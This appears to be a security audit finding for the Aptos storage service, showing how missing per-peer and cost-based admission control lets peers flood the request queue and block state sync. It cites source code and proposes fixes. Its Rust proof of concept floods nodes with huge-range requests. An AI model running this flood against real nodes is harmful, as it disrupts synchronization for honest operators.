# Audit Report

## Title
Storage Service Request Queue Exhaustion via Expensive Requests Blocks Peer Synchronization

## Summary
The storage service server lacks per-peer rate limiting and cost-based admission control for regular requests, allowing attackers to fill the request queue with expensive operations and block legitimate peers from synchronizing state.

## Finding Description

The storage service processes inbound requests through a network channel queue and spawns blocking tasks for each request without differentiating between cheap and expensive operations. [1](#0-0) 

The network channel has a configurable size (default 4000 messages): [2](#0-1) [3](#0-2) 

The server processes all incoming requests in FIFO order by immediately spawning blocking tasks: [4](#0-3) 

While the RPC protocol layer enforces a per-connection concurrent request limit: [5](#0-4) [6](#0-5) 

There is NO per-peer limit on regular request types (GetStateValuesWithProof, GetTransactionsWithProof, GetTransactionOutputsWithProof, GetEpochEndingLedgerInfos).

Subscriptions have per-peer limits: [7](#0-6) 

And optimistic fetches are limited to one per peer: [8](#0-7) 

But regular requests have no such protection. The request moderator only validates if requests can be satisfied, not their cost: [9](#0-8) [10](#0-9) 

**Attack Scenario:**

1. Attacker opens multiple inbound connections (up to 100 per node)
2. From each connection, sends expensive but valid requests like:
   - GetStateValuesWithProof with large index ranges
   - GetTransactionsWithProof with large version ranges
   - GetEpochEndingLedgerInfos with large epoch ranges
3. Each connection can have up to 100 concurrent RPC requests
4. These requests fill the 4000-message network channel queue
5. Each request spawns a blocking task that performs expensive storage reads
6. Legitimate peers attempting to sync cannot get their requests queued or processed
7. The storage service becomes unresponsive to honest synchronization attempts

## Impact Explanation

This qualifies as **High severity** ("Validator node slowdowns" / "Significant protocol violations") because:

- **Availability Impact**: Storage service becomes degraded or unresponsive, preventing state synchronization
- **Scope**: Affects all nodes trying to sync from the targeted server (fullnodes, new validators catching up)
- **Network Health**: Degrades network reliability as nodes cannot efficiently sync state
- **No Privilege Required**: Any network peer can execute this attack
- **Persistent**: Attack can be sustained as long as attacker maintains connections

While this primarily impacts fullnodes (validators sync through consensus), state sync is critical infrastructure for network participation and bootstrap.

## Likelihood Explanation

**High Likelihood**:

- **Low Barrier**: Attacker needs only standard network peer capability
- **No Special Access**: Does not require validator privileges or stake
- **Easy Discovery**: Request types and valid ranges can be obtained from any node via GetStorageServerSummary
- **Simple Execution**: Send valid but expensive requests repeatedly
- **Multiple Vectors**: Various request types (state values, transactions, outputs, epochs) can all be expensive
- **Force Multiplication**: Multiple connections amplify the attack (up to 100 inbound connections per node)

## Recommendation

Implement multi-layered admission control:

1. **Per-peer request limits**: Track and limit concurrent regular requests per peer (similar to subscriptions):
   ```rust
   // In RequestModerator
   per_peer_active_requests: DashMap<PeerNetworkId, AtomicUsize>,
   max_active_requests_per_peer: usize, // e.g., 10
   ```

2. **Cost-based throttling**: Estimate request cost before admission:
   ```rust
   fn estimate_request_cost(request: &DataRequest) -> u64 {
       match request {
           GetStateValuesWithProof(r) => r.end_index - r.start_index,
           GetTransactionsWithProof(r) => r.end_version - r.start_version,
           // ... assign costs to each request type
       }
   }
   ```

3. **Prioritization**: Process lightweight requests (GetServerProtocolVersion, GetStorageServerSummary) with higher priority than expensive range queries.

4. **Fair queuing**: Implement per-peer sub-queues to prevent single peer monopolization:
   ```rust
   // Round-robin across peers when dequeuing requests
   peer_request_queues: DashMap<PeerNetworkId, VecDeque<NetworkRequest>>
   ```

5. **Request validation**: Reject excessively large range queries:
   ```rust
   // In can_service for GetStateValuesWithProof
   let range_size = request.end_index.saturating_sub(request.start_index);
   if range_size > max_allowed_range_per_request {
       return false;
   }
   ```

## Proof of Concept

```rust
// Attacker simulation - would be run from a malicious peer
use aptos_storage_service_types::requests::*;

async fn attack_storage_service(mut clients: Vec<StorageServiceClient>) {
    // Open multiple connections (up to node's inbound limit)
    let num_attack_connections = 50;
    
    for client in clients.iter_mut().take(num_attack_connections) {
        // Send maximum concurrent expensive requests per connection
        for _ in 0..100 {  // MAX_CONCURRENT_INBOUND_RPCS
            tokio::spawn({
                let client = client.clone();
                async move {
                    loop {
                        // Send expensive state values request
                        let request = StorageServiceRequest::new(
                            DataRequest::GetStateValuesWithProof(
                                StateValuesWithProofRequest {
                                    version: 1_000_000,
                                    start_index: 0,
                                    end_index: 100_000_000, // Huge range
                                }
                            ),
                            false
                        );
                        
                        // Fire and forget - keep sending
                        let _ = client.send_request(request).await;
                        
                        // Small delay to avoid local rate limiting
                        tokio::time::sleep(Duration::from_millis(10)).await;
                    }
                }
            });
        }
    }
    
    // Result: Network channel fills with ~5000 concurrent expensive requests
    // Legitimate peers trying to sync get TooManyPending errors or timeout
}
```

**Expected Outcome**: Legitimate peers attempting to sync via GetTransactionsWithProof or other requests will receive errors or experience severe delays as the queue and blocking thread pool are saturated with attacker's expensive operations.

## Notes

This vulnerability exists because the storage service architecture treats all valid requests equally without considering:
- Per-peer fairness
- Request computational cost  
- Admission control beyond connection-level RPC limits
- Service prioritization for critical operations

The fix requires implementing application-level rate limiting that understands the Aptos storage service protocol semantics, not just generic network resource limits.

### Citations

**File:** aptos-node/src/network.rs (L147-167)
```rust
pub fn storage_service_network_configuration(node_config: &NodeConfig) -> NetworkApplicationConfig {
    let direct_send_protocols = vec![]; // The storage service does not use direct send
    let rpc_protocols = vec![ProtocolId::StorageServiceRpc];
    let max_network_channel_size = node_config
        .state_sync
        .storage_service
        .max_network_channel_size as usize;

    let network_client_config =
        NetworkClientConfig::new(direct_send_protocols.clone(), rpc_protocols.clone());
    let network_service_config = NetworkServiceConfig::new(
        direct_send_protocols,
        rpc_protocols,
        aptos_channel::Config::new(max_network_channel_size)
            .queue_style(QueueStyle::FIFO)
            .counters(
                &aptos_storage_service_server::metrics::PENDING_STORAGE_SERVER_NETWORK_EVENTS,
            ),
    );
    NetworkApplicationConfig::new(network_client_config, network_service_config)
}
```

**File:** config/src/config/state_sync_config.rs (L168-168)
```rust
    pub max_network_channel_size: u64,
```

**File:** config/src/config/state_sync_config.rs (L203-203)
```rust
            max_network_channel_size: 4000,
```

**File:** state-sync/storage-service/server/src/lib.rs (L389-419)
```rust
        while let Some(network_request) = self.network_requests.next().await {
            // All handler methods are currently CPU-bound and synchronous
            // I/O-bound, so we want to spawn on the blocking thread pool to
            // avoid starving other async tasks on the same runtime.
            let storage = self.storage.clone();
            let config = self.storage_service_config;
            let cached_storage_server_summary = self.cached_storage_server_summary.clone();
            let optimistic_fetches = self.optimistic_fetches.clone();
            let subscriptions = self.subscriptions.clone();
            let lru_response_cache = self.lru_response_cache.clone();
            let request_moderator = self.request_moderator.clone();
            let time_service = self.time_service.clone();
            self.runtime.spawn_blocking(move || {
                Handler::new(
                    cached_storage_server_summary,
                    optimistic_fetches,
                    lru_response_cache,
                    request_moderator,
                    storage,
                    subscriptions,
                    time_service,
                )
                .process_request_and_respond(
                    config,
                    network_request.peer_network_id,
                    network_request.protocol_id,
                    network_request.storage_service_request,
                    network_request.response_sender,
                );
            });
        }
```

**File:** network/framework/src/constants.rs (L15-15)
```rust
pub const MAX_CONCURRENT_INBOUND_RPCS: u32 = 100;
```

**File:** network/framework/src/protocols/rpc/mod.rs (L213-223)
```rust
        if self.inbound_rpc_tasks.len() as u32 == self.max_concurrent_inbound_rpcs {
            // Increase counter of declined requests
            counters::rpc_messages(
                network_context,
                REQUEST_LABEL,
                INBOUND_LABEL,
                DECLINED_LABEL,
            )
            .inc();
            return Err(RpcError::TooManyPending(self.max_concurrent_inbound_rpcs));
        }
```

**File:** state-sync/storage-service/server/src/subscription.rs (L371-381)
```rust
        let max_num_active_subscriptions =
            storage_service_config.max_num_active_subscriptions as usize;
        if self.pending_subscription_requests.len() >= max_num_active_subscriptions {
            return Err((
                Error::InvalidRequest(format!(
                    "The maximum number of active subscriptions has been reached! Max: {:?}, found: {:?}",
                    max_num_active_subscriptions, self.pending_subscription_requests.len()
                )),
                subscription_request,
            ));
        }
```

**File:** state-sync/storage-service/server/src/handler.rs (L257-260)
```rust
        if self
            .optimistic_fetches
            .insert(peer_network_id, optimistic_fetch)
            .is_some()
```

**File:** state-sync/storage-service/server/src/moderator.rs (L132-196)
```rust
    /// Validates the given request and verifies that the peer is behaving
    /// correctly. If the request fails validation, an error is returned.
    pub fn validate_request(
        &self,
        peer_network_id: &PeerNetworkId,
        request: &StorageServiceRequest,
    ) -> Result<(), Error> {
        // Validate the request and time the operation
        let validate_request = || {
            // If the peer is being ignored, return an error
            if let Some(peer_state) = self.unhealthy_peer_states.get(peer_network_id) {
                if peer_state.is_ignored() {
                    return Err(Error::TooManyInvalidRequests(format!(
                        "Peer is temporarily ignored. Unable to handle request: {:?}",
                        request
                    )));
                }
            }

            // Get the latest storage server summary
            let storage_server_summary = self.cached_storage_server_summary.load();

            // Verify the request is serviceable using the current storage server summary
            if !storage_server_summary.can_service(
                &self.aptos_data_client_config,
                self.time_service.clone(),
                request,
            ) {
                // Increment the invalid request count for the peer
                let mut unhealthy_peer_state = self
                    .unhealthy_peer_states
                    .entry(*peer_network_id)
                    .or_insert_with(|| {
                        // Create a new unhealthy peer state (this is the first invalid request)
                        let max_invalid_requests =
                            self.storage_service_config.max_invalid_requests_per_peer;
                        let min_time_to_ignore_peers_secs =
                            self.storage_service_config.min_time_to_ignore_peers_secs;
                        let time_service = self.time_service.clone();

                        UnhealthyPeerState::new(
                            max_invalid_requests,
                            min_time_to_ignore_peers_secs,
                            time_service,
                        )
                    });
                unhealthy_peer_state.increment_invalid_request_count(peer_network_id);

                // Return the validation error
                return Err(Error::InvalidRequest(format!(
                    "The given request cannot be satisfied. Request: {:?}, storage summary: {:?}",
                    request, storage_server_summary
                )));
            }

            Ok(()) // The request is valid
        };
        utils::execute_and_time_duration(
            &metrics::STORAGE_REQUEST_VALIDATION_LATENCY,
            Some((peer_network_id, request)),
            None,
            validate_request,
            None,
        )
    }
```

**File:** state-sync/storage-service/types/src/responses.rs (L727-742)
```rust
            GetStateValuesWithProof(request) => {
                let proof_version = request.version;

                let can_serve_states = self
                    .states
                    .map(|range| range.contains(request.version))
                    .unwrap_or(false);

                let can_create_proof = self
                    .synced_ledger_info
                    .as_ref()
                    .map(|li| li.ledger_info().version() >= proof_version)
                    .unwrap_or(false);

                can_serve_states && can_create_proof
            },
```
